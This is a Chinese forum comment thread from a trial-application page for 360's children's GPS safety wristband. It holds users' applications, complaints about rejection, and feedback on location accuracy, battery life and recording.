
楼主  那快件是从北京寄出来的？
怎么没有照片啊？很想看看儿童卫士的样子酷不酷~
赞。祝你快收到。咱们一起测试起来。
图很清晰啊。期待孩子戴上的效果图。
谢谢啊，希望能给你们带来帮助。
谢谢鼓励！
谢谢鼓励！
这是抽签的吗？“未通过”的原因是什么？不带这么忽悠人的。
这是抽签的吗？“未通过”的原因是什么？不带这么忽悠人的。

非常不错，之前玩xbox，现在看到这款更喜欢。希望能得到试用

我要中签~~~！
必须支持~必须顶！
恭喜恭喜恭喜~~~你！
3月12日来短信，审核通过，EMS寄出,现静等360儿童手环。第一次没通过，希望有试用的机会的网友，爱心十诚心十耐心，哈。
我还在等待EMS的慢慢悠 很不错
 好，好好好好好好好好好好好好好好好好好好好
应该是一起发的。我在北京所以到的快吧。试用报告可以先写上。除了分数和标签之外。其他都能再改进的。哈哈。加油
我今天收到短信了 说我中了 哈哈 
是啊。应该是从360总部寄出来的吧。
嗯。应该是从360总部寄出来的。
ddddd
哇哈哈，我今天中午收到短信了，说是昨天ems给我寄出的，好期待啊
iPhone的客户端还没装呢，等周末回去给孩他妈装上试试。
今天只对拿到的实物进行了一些介绍，后期会对使用效果进行详细测试。
周末会更新孩子带上的效果图。
哈哈 你家宝宝看到了吗 喜欢咩？
说的很详尽呀 都是实打实的功能建议..赞一下
报告很细致，儿子也很帅！
写的不错，提的建议也很好，值得学习
我发现了你的app是不是最新版本啊。，
评测很专业啊，图片超级清晰的。
骗子 免费试用都是骗子 
很详细的评测报告啊。赞
好想要啊啊
超级酷的啊。
很好安全驾车
貌似挺不错的
这个东东挺好玩，关注
这个
老婆们的查岗利器。
这个东西很棒啊。特别想买
没有详细的看头！！！
物联时代的好产品
求工程机试用
求试用啊啊啊
这就是中彩票 没事点点 
看起来不错啊，支持下，期待我的也能快点到
哈哈。谢谢
快来抢楼了哦~~~
抢沙发~~~~~~
大家都要中签哦~~~
恭喜大家都中签呀!
默默念~我要中签！
必须要中签！
这个得好好试试。
我只想说一句，为嘛096号都收到货了，我048号昨天刚邮寄，这不是给我的试用报告时间就短了？
我11号收到有试用资格的短信  现在快递还没到  兴奋中~~~
赞一个。哈哈
我的我的呢？在路上呢！
这也叫测评？
哈哈~赶上直播啦~期待LZ更完哦~
安卓客户端比iPhone的酷很多啊。
写的很详细、用心 赞一个~！
你这是要加精的节奏啊。
我也中了,希望快点能到.
还没收到手环，先赞一个
好评测，专业味
希望快点收到！
期待继续更新啊。
赞一个。哈哈
没有图片。。。
赞两个~~~hiahia！
什么啊，我刚收到！！
为什么手环录音呢？因为这样用的是流量啊 不然直接接通电话还要另花话费 而且成本也要增加
很详细啊。赞一个。期待更新。
运气真的是好啊。
我没有通过，不知道 
写的真多 支持一下
赞一下啊。宝贝很可爱。
很帅的全套照啊。哈哈
照片照的真清晰。
支持一下。
很赞呦~~~
必须赞一个  挺好用的   对于家长孩子都很方便，小的地方有待改进，愿越来越好！！！
写的好有爱~赞赞赞~提醒下楼主周末发宝贝试用效果的时候注意保护宝贝隐私哦~关键词多打点马赛克。。。。
哇 一看就是一个很细心的父母，，报告这么认真 仔细~~
真的O(∩_∩)O哈！
非常细心的试用官耶
感觉建议很好啊。
编者按，噗，LZ是专业记者吗？好专业的赶脚~~
还有吗？ 呵呵
专业呀 可以..
当然，别的都在秀受的手环，而我是光反馈信息。
胖孩子真的带不上吗？哈哈
很有参考价值啊。
有点短呀！呵呵
真是太羡慕你了，真是尽职的好妈妈
也不知道360是不是在搞噱头，根本就没有的。
很细致，赞一个！可惜我没申请成功，等上市了以后以后一定买一个
充电小手看起来很体贴，宝宝一定喜欢，希望可以早日买到
感觉还是有一些小问题的，希望360能尽快解决
孩子的照片很可爱啊。写的真的很实用
很技术的试用报告，赞一个，希望能持续更新
逻辑很清晰啊。有很高的参考价值。
骗子 水军 死光光  国人信用悲哀
听说卡费前几个月是免费的。
无奈！在线写的报告，这个文本编辑器很不给力，总是插入图片后无反应，几次重新插图，仍是丢图~~
谢谢啊，其实录音功能挺实用的。
更新了  怎
更新了 怎么样呀
问题好多的
看来存档功能很有必要啊。
这个应该很真实啊。有很多收到试用产品的用户都写了非常好的报告。挺不错的。
不错，顶一下！写的比我好多了，学习！
这么巧。正好是78号啊。羡慕。
儿子带上很是帅啊。
锋芒小栈？这个是什么啊。
一张图解决所有问题啊。哈哈
9号是我喜欢的数字，009这个号很不错啊。
图片配在一起很可爱..儿童产品就是对孩子的呵护啊
一家以科技数码产品为分享的小众社区 经常会做些产品评测~~
聘书不错哈，是让你提交报告，如果好的话，以后会有更多的产品给你测试……
看来写好申请理由还是相当重要的...
这就是报告啊，本来是想重新传的……可是家里的adsl 太不给力，只好转帖我在单位发的图了。。。
哇哦 78号还赶上儿子8岁生日 赞一个~
搞IT的 果然写的很专业...
照片拍的很用心 这位是专业摄影师滴干活吧 哈哈
分析的很实在 功能核心要做好做扎实..
赞一个！！
全图片评测 有功力呀~~赞
期待更新~~
写的很详尽呀 赞一下~
产品还在不断完善 建议很好~
去哪里可以买到啊·
非常好的试用体验。 对我们改进产品非常有帮助
帅锅~谢谢拉~~
呵呵，谢谢！
哈哈，谢谢！
很好的一款产品，在第一次试用的还有点小问题，如充电触点有时会接触不良，定位精度有些许偏差，续航能力有点低，望后续产品能改善这些小问题，我是第一批试用者
谢谢啊 大家一起来完善儿童卫士
什么时候有买？？？？
测试一下嘿
测试一下嘿2 
哈哈 LZ辛苦啦~
最爱那个设计 很贴心~
为什么木有同过啊
哈哈，纯使用说明书。
赞！写的真详细。可以加为精品了啊。
试用报告提交没反应呢
提交不了评论呢
前边部分是在写说明书吗……咱们好像是来反馈的。
可是我是从官网扫描二维码以后下载的也！最近又有更新了吗？
不错，报告写的很到位
图片拍的很漂亮~
前一部分的可以忽略
好哈好啊好哈
好哈好啊好哈
这篇报告很详实。
评论提交不了呢
我也是“儿童卫士”一员：）
按钮很神奇啊
非常期待能够获得试用名额。
很帅气。很酷的产品
这个拆的详细。不错
怎么试用官卡片都皱了啊。但是还是很酷。
我试用后发现手环最专业的功能都需要很大改进！实话实说，用基站定位让宝宝1分钟内移动了三个地方，与实际位置相差近2公里……。GPS定位准但是基本上宝宝都是在有空间遮挡的地方，很难成功GPS定位。这两项基本功能的稳定性直接影响以后上市销售的。切记！
太恶心了。。。。。。害我们都没有申请到
我没有通过，不知道
唉 未成功
是的 加油支持360
我也申请儿童卫士已经三次了，还是没成功。我没有试用这个缘份，希望能够早日上市！
见识了，赞一个！
。。。发错地方了老大。这个是智键不是儿童手表。
这个我怎么说好呢？大哥你走错片场了。
这是在炫耀连续中两期啊
这是在炫耀连续中两期
加油 什么时候能编辑完啊
测试 测试 测试
测试测试车上
好详细~你家宝贝好帅气！而且我也有个一样的浴袍哈哈
宝贝很帅气啊
加油 看什么时候能补充完
继续测试一下~~
哈哈 很赞很赞~想神马就有神马~
看看有多小清新
ls lss +10086。。。
这位同学你发错地方了，快删除去儿童卫士发吧
GPS都是一个样的！好的，好到我上千元的导航，都是一个样，有遮挡物的话，都很难定位成功的，另外基站的话，我觉得基站定位有误差这个是肯定的，了解一下基站的定位的工作运行方式就知道了，不过我觉得你提的意见也是很有帮助的，希望官方可以解决这些问题！
呵呵！我还有一个360官方颁发给我的一块360***机试飞员的军牌！那个不会皱是钢的！哈哈
恩恩！后续将出软件应用跟硬件的协调性报告！
评测写的好详细啊！看的我都想赶紧买一个给娃用了。
建议很好啊，外形确实应该考虑小孩子的卡通心理。
我也想买一个了。
好精彩的报告啊 鼓掌！
小逗逗。。。报告里应该加上视频就可以看你家宝宝暴力拆箱了哈哈
好帅气的宝宝
被坏人恶意取掉确实是一个问题，。
之前一直有网友反馈说录音功能不好用，现在看来这个问题已经得到很好的解决了啊，期待尽快上市，会第一时间购买
这评测媒体跟我评测的差不多
这个报告费了不少劲，写完好几天了，就是提交不了。今天终于提交成功。
感谢辛辛苦苦的工程师们！
感谢 360飞奔的猫、刘磊
360手环的定位非常精确，深深地打动了我这个做为家长的心，故积极申请，希望能有机会。
我今天收到短信了 说我中了 哈哈
lz这是没写完吗？？有图吗？期待哇
这就是中彩票 没事点点
怎么才能抢到啊?55555.....
拉倒了 又没抢到
申请了n次
奇酷网很给力啊。果然有现货啊。刚筛选完就能发货了。
挺好的活动。虽然没中。继续期待。
这轮试用通过的3.11就开始发货了，我们在年前试用通过的用户和怎么都没有消息了呢/ 在搞什么飞机。
申请了n次，参加了n次试用互动，没一次通过的，我想说，要嘛直接上市，我会买，再这样下去，我都快磨灭得没心思再关注了。。。。。。。。。。。。。。。。。。。。。。。
为什么我这么需要，却没通过？太不科学了。。。。
没通过呀，，，，，
哎 木有通过！！！
未通过。。。。。。坑爹不试用了
伤害了用户的心。
还没申请上？不如换个360头像试试。
干吗这么吊人胃口啊！要卖就卖痛快点！
客户端在我手机里装上都一个多月了,以为能中,结果又是失望啊!
屡败屡战、屡战屡败。。。 下次试用什么时候？ 一切为了孩子，为了孩子的一切。。。
真你MD坑爹！
我也申请儿童卫士已经二次了，也是没成功，看来没有试用这个缘份，希望能够早日上市！
真闹心，东西出来了。试用几次，都没成功。又不上市卖，等得心都碎了
写这么少，下期肯定没资格了。我得好好用用，好好体验，好好写一下报告。
哎好失望，又没通过试用申请，已经第二次啦！这个箍选标准到底是什么啊？还是随机抽取来着。想给我6岁的儿子申请一个就这么难。要么你快点面市出售也好哇，去年说12月份就能面市了，结果到现在了还在测试，到底行不行啊？
我申请儿童卫士已经三次了，还是没成功。看来只能等到上市了！！！
竟然没能通过申请～
我已经申请了名字：vimin007
希望能申请成功！
耐心等待中！支持360！
期待ING...
等你等的工心痛啊，呵呵
希望申请能成功。
都10号了，怎么还没好啊，希望申请到一个
360卫士儿童好伴侣 加油加油
哇哇哇！家有孩子，这是非常有用的！ 快点出产品。可以速度买！非常需要的手环啊！
急需要这样的东东给孩子带着，希望能申请成功。
360卫士儿童好伴侣，如果申请不到，希望产品快点上市，赶紧给家里的宝贝标配一台。
希望能有。。。
支持360
呃，还不错的东西
谢谢360
希望360多多加油，多多出新产品
错过试用很懊悔，希望能再来一次，始终支持360，加油！
加油支持360
加油支持360
???试用，骄傲！
继续创新 我们关注你
我有一个建议 就是这个手环可不可以在碰到水的时候会自动往手机上发送安全警报
支持360 喜欢周总风格
加油，360！
360的很多产品我都在用哦，呵呵！
奇虎360,我们一直支持你，希望360儿童卫士能申请成功！
星期一星期一，神啊360啊眷顾我吧
安全产品我一直用360，好几年了！NND，就是不用腾讯的
360就不要试用了，卖给我一个也行！虽然我在4021块申请的，估计申请不到啊！为这个360手环已经烦了半年了！眼睁睁的看着别人申请的，没有办法！郁闷-----
加油加油，支持360，真的不错
第二次申请了，上次没申请到，不知道这些能不能成功啊！等星期一。。。。。。。
得之我幸，不得我命，支持360！
持续关注，期待奇迹
从微博转发试用开始就一直参加活动，都没中过，希望这次能申请到
阿门，等得心都碎了
周一才公布结果是啊
我抢到了吗
时间快到了，倒计时，期待
360加油
是啊期待申请通过为了孩子
我有希望吗？？？？？？
阿门，亲给我一次抽中吧！
希望能审核通过，支持！
期待申请通过
支持360
啥时候能买啊
期待通过，非常需要
<<<<<<
下载了应用，等待手环中.......支持360！
今天快就结束了，希望能审核通过
赶紧放开购买吧，等试用急死了，天气转暖，孩子外出的活动越来越多，也越来越让人担心。
怎么这几天关注的人不多了？
等待产品，好期待
去年申请成功的，现在也没收到...
我也装了APP。为了孩子
期待俺能通过，已经期待很久了
非常期待能正式上市！支持360！
期待能试用。。。。。。。看描述真的非常棒的产品。
什么时候开卖呀，试用的我想没戏了
现在孩子正需要，花钱购买也行啊，要不等孩子过了年龄段了，或者出现其它竞争产品，我看360也就很难再翻身了吧
好产品都会很抢手的，大家攒人品就是了，嘿嘿！
申请的人太多了，获得试用的机会太小了，什么时候可以开放购买阿，希望360儿童手环能早点上市。
期待啊，已经破万了，获得测试的几率又渺茫了。女儿也不停地在问何时能买到啊。尽快开放购买吧。好捉急啊。
我软件都下载好了~就等体验了-_-|||
机会渺茫啊！
我就是来看评价的 我同事的已经收到了。。。
期待中，这次有我吗？
儿童卫士，为儿童保驾护航，父母放心。
坐等 内测啊  曾经内测过 手机卫士   希望等继续得到机会  感谢啦~~~
360儿童卫士我又来了，希望这次能申请到。
等你等了好久了
当看到360出了一款儿童卫士，我真心喜欢，自己家有宝宝，现在还不大，时时刻刻担心。有了这个就不怕宝宝一个人到处去玩了。在哪里时刻能找到。
可怜天下父母心………………
一直关注着这款产品，一直参与各种活动，但都没有成功。现在看见这个活动，不由再次心动。曾几何时，噩梦惊醒后搂着女儿不松手。如果有了这个手环，就为她的安全加了到保护门。希望能体验360儿童卫士！支持360，支持国货。
终于找到一款能够保障儿童安全的产品了
每一次申请试用，并不是单纯为了自己，也有对360的信任，有对所有为人父母、为人子女的人的一份责任。要做，大家就一起做最好的。
有了360安全手环，妈妈再也不用担心我会跑丢~！
希望申请成功，为宝宝多一份安全保障！
申请两次了，如果这次还没有抽中的话，可以花钱买吗
360相伴，安全无处不在
直接上市销售多好，非要搞的这么折磨人。
作为360早期用户，每次都申请不到，悲催，求过～
很喜欢这款产品，希望能够通过申请，当心崽崽的安全
永远支持360！
希望能申请到，
不错，很实用的产品。
我只想说：国产加油！
迫切希望能成为此产品的试用者和受益者，也希望这样的产品通过试用者达到推广，能尽快上市，让更多的人了解并使用！
这个软件太好了，可以知道孩子在哪里，就不把走丢了！
很好的一款产品，申请试用。
希望我能成为360中的一员
我希望给孩子一个。谢谢
360拥护者啊 该让我榜上有名了吧
看起来好像很不错的样子，以后如果去人多的地方戴上这个会很方便的！希望能申请试用！
之前有申请，并收到短信提示成功，但一直未收到
希望试用名单上有我的份。
这产品太牛了，对于我们上班族来说，随时知道孩子去向。太方便了。
我家宝宝现在开始上幼儿园了，每天都需要接送，我上班很忙，回家都很晚了，所以这项艰巨的任务都落在了年迈的父母身上，而他们又没有多少文化，不认识多少字，所以，孩子的安全问题都是让人很担心的，有了这款神奇的产品，算是解决了广大父母的后顾之忧，特别想体验它的强大功能，可以推荐给亲友
对360产品充满了期待，一种具有科技创新和人文关怀的公司总是让人期待他的所有产品，对红衣大侠也是真心的佩服和欣赏，希望能有此机会得到此产品。
现在用了360的wifi和路由，舒坦，碉堡了！
产品定位比较准确,通俗点讲是比较实用,家里就一个孩子,是全部关注点. 希望选中试用.
求试用求试用
希望能选中试用，将会给大家带来详细的分享评测。儿童手环，给宝宝360度的无死角关爱。onemoononestar
儿子五周岁了!爱玩和调皮的他喜欢吵着要出去玩,希望能申请试用360的儿童卫士，这样他上幼儿园和带他逛街就方便多了!
宝宝是家长的一片天，时刻掌握他的一举一动，360提供的就是我需求的，希望能获得此宝贝做为宝宝下个月的生日礼物。
感谢奇虎360，给我这次申请试用的机会，希望能申请成功！给我三岁儿子一个惊喜。
几次都错过了，期待这次可以参与试用。
希望能被选中试用，按不同城市选择试用对象应该是个好方法。
我现在用的360wifi是一个绿色的，用不了多久就会明显很脏，卡扣做一个好一点，儿童不意找开，防水做好，手环舒适性还要考虑好。
期待，非常想得到试用的机会额~~~
上次没赶上使用申请，这次希望能申请到
支持奇酷，支持360！希望可以获得试用！
上次申请就没选上希望这次能选中！
等啊，终于等到又一次试用。啥时候开始正式销售啊？国内很多儿童安全定位产品貌似属于定制，没有360这么全方位的与家长互动，获取家长希望的功能。360，好样的！！！
宝宝快上幼儿园了，做父母的总是不自觉地想想宝宝现在在哪儿？正在做什么，360恰好能够将宝宝现状实时告诉我，希望能够申请成功
不能申请啊！增加地址报网页错误
很希望能成功
上次擦肩而过，这次希望可得！
期望产品!
等了好久了，咱还不上市呀？只能预约试用了！
上次试用没有得到，但愿这次成功 永远支持360
我也提交了一份,希望能成功,能使我们父母的随时观察宝宝的位置,安心的上班。
上次没赶上，希望这次能够被选中吧，期待中！！！！
一定要通过啊。
提交了申请了，希望能通过。
真的很需要此项产品，希望能得到试用名额
我是乌鲁木齐的，希望能申请上，已经提交了，谢谢！！！
加油奇虎，好创意大众享受
这么好的东西，求试用
已经提交申请了，希望可以得到！
已提交了，希望这次能够被选中。
孩子去哪儿了？
太需要了......
帮我侄女申请了一个，不知道这样行不行，不得不说360对需求的理解太厉害了。市面上那么多手环我没买，一是因为普遍价格偏高，二是使用续航时间太短，没隔一段时间还有取下来充电，这点很坑爹的。
确实是好产品，but：木有试用怎么知道产品的好呢？怎么告诉消费者，这个是好产品呢？
好东西呀，真想要一个
很多好的东西，希望我能中呀，已经申请两次了，一定要中呀。
一款好有爱的产品，谢谢！
真是好东西
我要啊………
紧张期待中，希望能中。
上次的试用参加了，很难过没有成功，希望这次能够如愿哦
第一次来，现在才知道360还有一个奇酷。
上次申请没有成功，这次希望能申请成功！
希望申请成功
已经申请了，就等结果了。这心情那叫一个捉急啊。
己经分享微博,希望一成功.
很认真的关注一个产品，从一开始微博知道，到论坛到转发到试用，每天都很期待。因为觉得的好东西，如果公开销售了也会买，只可惜现在买不到！
怎么申请？
上次申请没有成功，这次希望能申请成功！拜托
我支持你们好久拉。跪求一个手环
已申请，希望可以得到手环哦~~奇酷网好活动！
再次申请儿童卫士，拿到之后会按时提交评测报告，希望能通过
这个报告写的不错  可以  宝贝也比较实用
为啥没几个人注意我的测评报告呢？难道我绞尽脑汁为大家的孩子找问题没人支持么？
请楼长再写点哇！！！
听说我用了。录音功能好用，能录15秒的音频。然后在手机上播放。
去哪里可以买到啊・
骗子 水军 死光光 国人信用悲哀
骗子 免费试用都是骗子
未通过起码告诉我们原因好吧
尼玛审核有什么标准？有意思吗，内定的吧；害老子还认真去想，能透明点吗？明天就全部删掉360所有软件。
我在第一季
好像得到她啊！！我是达人，喜欢折腾！
测试一下子啊啊啊
测试一下测试一下测试一下
asdasdasdasdsa
213123123123213
我想要亲........
真你MD坑爹,让我爆粗口是你们的审核是用下体嘛，毫无公信力！
很惹火的营销手段呀！
fdasf
什么时候上市啊~宝宝刚上幼儿园想买一个给宝贝带~

好期待！可惜又没中
客户端在我手机里装上都三星期了,以为能中,结果又是失望啊!
你妹的 专叼人胃口我操，申请不了
什么时候上市卖啊
唉，没选上……
每天逛一逛，看一下有我的名单没
好久才能出品哦
10点了，什么时候公布啊？
好得东西，期待中，爸爸每次爱喝酒，醉了最怕怕
等啊等，希望能成功
今天就要揭晓结果了~~期待~ 选我选我~~
360卫士儿童好伴侣，如果申请不到，希望产品快点上市，赶紧给家里的宝贝标配一台，给朋友购买几台。
360卫士儿童好伴侣加油加油
关注这个儿童卫士有一段时间了，很希望能够拥有一个，能够为刚出生的宝宝保驾护航。
我也想要一个给我宝宝，他才1岁。
这个好，我很想买一个，给我宝宝用，我在外地工作，很想知道宝宝在哪。
可以买吗，我想买一个。
真心是好东西，真希望这次能申请成功！
哎，什么时候申请的啊，没赶上趟。
第二次申请了，上次没申请到，不知道这些能不能成功啊
一直在用360产品，希望360多多加油，多多出新产品
有了奇虎我就开始在一直使用着。并且从我还是是个孩子，竟然都有了孩子。哈哈。奇虎的确伴随我时日够久。三台笔记本。6部手机，2台台式；从未使用过其他产品的杀毒，原因我觉得就一个，简单，便捷，创新。qq大战的时候一度曾经为了支持奇虎。改用微博。哎！骨灰级的患者，都是不是玩家了。真心希望多考虑下我、
错过了。。希望继续试用。
10年了 一直使用360
非常非常希望啊
360威武支持360
去年申请成功了，12月份也受到了确认短信。询问了好多次，可是到现在也没有任何的回复。不知道还要等到什么时候啊？？？？
希望可以啊
好希望我能申请到
希望越大，失望也。。。。。
周一才公布结果啊，好着急~~
马上就结束了啊。期待
希望可以出WP版本
期待申请通过
真心希望试用下
真不错.!
希望啊！非常非常的希望啊
下载应用了，感觉还真是不错
这款产品真心不错啊，应用已经下载安装，就等申请通过了。
应用已经下载，等待手环使用啊！！！！支持360，强！！！
非常期待，APP已经装好了~~ 就等手环啦~~
客户端都已安装，只欠通过审核试用啊，希望能通过了。。。拜托。
期待俺能通过，已经期待很久了，，，
好产品自然有需要的人，希望能开放购买。试用只是一时
尽快的完成，恨期待
希望能追加试用品,需要的人老多啦！
期待试用啊 软件已经安装在手机上了，看着挺好的
每天都来看看，申请的人好多呀，不知道我是否能为儿子成功申请到一个呢
天天来瞄瞄
我也希望能追加试用品，我很希望我能得到他。
女儿很淘气，我们也很担心，希望能评上，谢谢奇酷，谢谢360！
1%的中奖率了啊
这个命中率太低了。
超过一万申请人，主办方能不能追加试用品，大家说怎么样
还有三天，看能不能中
希望能中。中不了就看看别人的评价了。
等的心焦，期待我能给儿子尽快用上
啥时公布结果？
如果申请不到试用，请问如何买呢，
还在等结果，急啊急。孩子现在两岁半特调皮，乱跑。快上幼儿园了。这玩意申请不中上哪买。。。
如果申请不到试用，请问如何买呢，
为了能够完善孩子的安全及教育！需要这个产品…望能够试用上！！谢谢
很期待啊。很火爆啊
为了孩子想使用一下
能拿到当然最好不过
360儿童卫士，这回该轮到我的吧！支持360！
这款产品真是符合现在家长的心理，真心希望能申请到，好用的话会多做宣传，解决更多家长的担忧
很是不错的，很适合家里的小孩
其实每个家长都有这个担心，但又不能实时解决。我家的小妹妹今年才6岁，已经很爱去外面玩了，有时候看到大人担心，自己也不好说什么，希望小编能给个机会，谢谢！
喜欢啊，对孩子安全很重要
希望能申请成功这款360儿童手环，女儿下半年九月份就读小班了，想申请成功给她用，到时候一定会认真完成使用报告，请给与这个机会，谢谢。
试用报告在哪写呀
我对360产品一直情有独钟，从杀毒到安全卫士，从电脑到手机，现在有有了贴心又实用的手环，给千百万家庭带来了安全，我一直希望有这样的产品。如果我得到了试用权，一定要好好测试，倍加珍惜这得来不易的机会，同时要大力宣传这款产品。支持360！！！
一直以来就想这个世界上，谁能设计一款可以知道孩子在哪里的产品。结果我很骄傲的知道，我们中国的360公司率先推出这一神器，并且价格很亲民。非常期待正式产品的推出，我一定会为孩子购买，包括我周围的朋友的小孩。如果有幸能获得这次试用机会，我会好好的认真试用，并提出更好的建议和传播。
我家孩子也差点走丢，幸好找回来了！现在想想还是很后怕，希望有机会体验360儿童安全卫士
为人父母总希望自己的孩子平平安安的，我只希望此次试用会是一个不错的尝试！为了孩子，支持360儿童卫士！我希望和我的孩子可以参加试用，以便可以更加完善它！！
这是一个造福粑粑和嘛嘛和宝宝的好产品，是一个积德行善的好产品，这么好的创意，这么好的产品，真心希望早日进行市场运作，造福更多的粑粑和嘛嘛还有宝宝！
外观和颜色很对我的胃口，就是不知GPS精确度和续航能力如何，真心希望能获得试用产品，用得好，估计会介绍给身边的朋友~哈哈哈~
估计产品还在改进阶段，拿出最好的产品再卖。
为了孩子的一切 一切为了孩子 真心求到手啊
不能交点钱，让大家先买了吗？
自从这个手环出来后，一直都在关注，真是太喜欢这个安全手环，希望申请成功，为宝宝多一份安全保障！
期待能够通过申请，让孩子出行更安全，让父母更放心，更安心！
看了360儿童卫士的介绍，觉得是一个非常好的产品。这款手环，无论是从外观设计，还是从功能上面，都非常的好。外观上设计简洁漂亮，简约而不简单；录音、定位等功能实实在在地给孩子的出行带来安全保障，期待能够通过申请，让孩子出行更安全，觉得孩子永远有这个必要好好保护，选择360儿童卫士，多了一份保障让父母更放心，更安心！
超级喜欢，360在穿戴设备上先从孩子入手无疑抓住很多家长的心，从孩子开始让国人慢慢熟悉了解穿戴设备，从而进一步开发出适合成人佩戴的运动型穿戴。我个人很看好穿戴设备的未来市场，希望360能越来越好，做得越来越完善。希望可以通过审核吧
非常非常喜欢这款产品，真心希望能通过申请！
这款手环，无论是从外观设计，还是从功能上面，都非常的好。外观上设计简洁漂亮，简约而不简单；录音、定位等功能实实在在地给孩子的出行带来安全保障，期待能够通过申请，让孩子出行更安全，让父母更放心，更安心！
特别喜欢，觉得孩子永远有这个必要好好保护，选择360儿童卫士，多了一份保障
看了360儿童卫士的介绍，觉得是一个非常好的产品。我的申请不知道什么时候通过。
一直是360忠实的关注者和使用者，一直希望360出自己的聊天工具，超越TX
很好很实用产品，希望可以申请到，一定提交具体详细的使用说明，并预祝越来越好，马年旺旺ing.
希望能申请成功，谢谢！！！
请一定要有我的份啊，我是给儿子用的，关注这个好久了！
希望能被选上啊。。。
爸爸都62岁头发花白了，没过到老年人应该享受的幸福晚年，还天天骑电瓶车风雨无阻接送我女儿，内心相当愧疚，曾经想让女儿自己坐公交车去上学，又怕遇到不好的事情，就在前段时间，女儿在书店看书遇到了变态，我赶到后逮住了坏人，打110后交派出所，警察让我先回家，放人前会通知我，结果当天半夜就把人给放了，我是第二天去派出所问结果的时候才知道的，还跟警察吵了一架，对这个社会好失望。这款儿童卫士，能解决我的担忧。
一直在找一款可以保护女儿出行的定位工具，本来想买个定位手机，但好象定位不精准，后来表弟告诉我的，360在做一款儿童安全卫士，可以戴在手上，比较方便，最主要的是定位精准，还有报警功能，并且用的是低敏材质，简直太高兴了，恨不得马上就拥有，一直在关注，结果一直没找到销售渠道，原来是现在只试用啊，第一批错过了，很遗憾，真心希望这次能被抽到啊。
产品不错，就是添加地址无法添加，老显示网页错误
这款产品真是家长的贴心小棉袄啊，太贴心啦，真心希望能够拥有一个给幼儿园的宝宝用，这样宝宝去哪里我们都放心
希望能得到试用的机会，分享给群里的所有妈妈
是个好产品，社会意义也很大
哈哈，这个产品，太酷比啦
这个产品真的是研发到了家长的心里去了。太适合了。就算试用不上。我也会尽快买一只
我是360系列产品的忠实用户，知道有安全手环的存在后，就一直关注，去年第一次的免费试用没有抽到很遗憾，就想快点购买一个给宝宝使用，只是周大不给力，让大家期待ING。加之最近家中老人走丢，很努力找到后，突然想到了儿童手环为什么不能扩大使用人群，让年幼的孩子、独居的老人、特殊群体同样受到360安全手环的照顾和保护，此举必将功德无量，社会效应也是客观的！如能此次得偿所愿，定会尽力推荐周围朋友和家人！
支持360，作为铁杆粉丝 希望能有试用的机会。
每次360总能给我们创造很多惊喜，这些惊喜将会给我们带来更加幸福的生活！
360很给力！
希望尽快发行。 也希试用资格
天天360安全放心还省心！！！
太喜欢这款儿童卫士了，简直是极品发明！！！赞啊，跪求试用！
干嘛写不了地址 申请不了呀？
去年通过申请的不给了？
期待产品早日上市开放购买
呵呵，如果有机会，看看效果如何哦
不知道材质易清洁消毒否，不希望该产品“藏污纳垢”成为细菌病毒的温床。
不错的产品，不知道能不能申请到！
地址填不了啊
材质上：增强耐磨性，尤其针对按键，出现用一段时间后就松动甚至出现失效，外表出现表漆脱落。增强耐脏性，比如360随身wifi，我用的是白色，过不了多久就显的很脏，那个是所用橡胶材质易脏，其次因为白色更明显。因为是孩子穿戴，所以必须提高舒适性，卡扣部位长短设计，手环背面舒适性设计都要考虑到。电池负载上，建议设置提示功能，比如在晚上六点定时提示手环电量约可使用几小时，这样不会让父母忘记及时充电。
1：建议加入电子时钟（很实用） 2：耐磨耐脏耐拆 3：更好的解决电量问题 4：针对进入信号盲区做一定的优化
好希望能成功
我家宝宝现在开始上幼儿园了，每天都需要接送，我上班很忙，回家都很晚了，所以这项艰巨的任务都落在了年迈的父母身上，而他们又没有多少文化，不认识多少字，所以，孩子的安全问题都是让人很担心的，有了这款神奇的产品，算是解决了广大父母的后顾之忧，特别想体验它的强大功能，可以推荐给亲友
没想到在这里看到这个喜庆，我上班又没时间带孩子我晚上才下班，我老婆又不在家要做上班，家里一个七岁孩子读书因为学校伙食太贵所以要回家吃饭，在路上不安全，家中就我妈要去学校接孩子也是很麻烦所以要是我能申请到的确是很开心，以后孩子就可以知道孩子情况了
支持一下360，不知道能不能申请到？
申请尚未成功，仍需继续努力
上次没有成功，希望这次能通过，真心非常喜欢这个产品，真心需要这个产品！！
已经提交了，希望能够试用。
真心希望能被选中
在现在这个时代这样的产品真的太重要了，真心希望这次试用能被抽中，不过希望渺茫，还是请360尽快将产品上市，即使没抽中，也可以有地方能买到给女儿用
已提交了，希望这次能够被选中。选中！！
上次没有成功，希望这次能通过，真心非常喜欢这个产品
希望但愿这次可以申请成功。
快来我家吧，我都等不及了。
希望能有我呀。
申请了一个，真心希望到我碗里来！
已经提交申请啦，好激动。。。。。
希望奇酷网能给我家宝贝女儿一次机会，让她能得到更多的呵护与安全。提前谢谢啦！
我已经提交申请了，希望可以得到！！
上次申请没有成功，希望这次能够如愿！
希望能中。
360儿童卫士，360度全方位全天候为孩子的安全护航！好产品！快到我家来吧~
已经提交申请啦
上次申请没成功，希望这次能如愿。
好活动 支持
我也拼一个
360真是能颠覆传统产品，新奇特产品期待使用。
宝长大了，能自己到处跑了，做父母的自己是满心欢喜，但担忧也随之而来，宝宝如果和我们走散了，该怎么办呢？尤其是在假日的人潮中，宝宝走丢更会让父母手足无措的~现如今社会上很多不安全的因素，如果在公共场所和大人走散了该怎么办？越想越担心！今天发现360儿童卫士，感谢360开发了这个产品真是为做父母解决了一大燃眉之急！我马不停蹄来申请试用，希望能为宝宝能争取到这个难得的试用机会.
宝长大了，能自己到处跑了，做父母的自己是满心欢喜，但担忧也随之而来，宝宝如果和我们走散了，该怎么办呢？尤其是在假日的人潮中，宝宝走丢更会让父母手足无措的~现如今社会上很多不安全的因素，如果在公共场所和大人走散了该怎么办？越想越担心！今天发现360儿童卫士，感谢360开发了这个产品真是为做父母解决了一大燃眉之急！我马不停蹄来申请试用，希望能为宝宝能争取到这个难得的试用机会！
上次申请跟大家一样没成功，微信比拼没赢。希望这次能如愿。
我一定要拿到
我一定要拿到。
收货地址在哪里填写啊，没看到有地方啊！
大家要记住自己的360账号。上次忘了就很麻烦。
上次申请没有成功，这次希望能申请成功！拜托
点击申请 提交信息 一提交就可以啦！！
上边有个大按钮。免费申请。然后就可以申请啦
如何申请？
希望能试用啊
怎么申请试用啊
哈哈哈哈哈
很棒的活动啊。支持一下。
已申请。希望能成功。
申请信息在哪里填啊？
申请页面在哪阿
